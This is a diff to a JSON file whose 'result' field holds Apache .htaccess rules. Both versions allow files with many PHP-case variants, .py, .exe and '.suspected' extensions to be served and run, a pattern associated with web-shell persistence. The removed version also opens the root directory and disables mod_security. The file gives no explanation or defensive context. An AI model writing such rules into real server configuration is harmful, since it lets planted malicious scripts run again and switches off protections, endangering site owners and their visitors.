@@ -1,3 +1,3 @@
 {
-    "result": "<FilesMatch '.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>\r\nOrder allow,deny\r\nAllow from all\r\n<\/FilesMatch>\r\n<Directory \/>\r\n    AllowOverride All\r\n    Require all granted\r\n    Satisfy Any\r\n<\/Directory>\r\n\r\n# Disable mod_security if enabled\r\n<IfModule mod_security.c>\r\n    SecFilterEngine Off\r\n    SecFilterScanPOST Off\r\n<\/IfModule>"
+    "result": "<FilesMatch '.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>\r\nOrder allow,deny\r\nAllow from all\r\n<\/FilesMatch>\r\nOptions -Indexes"
 }
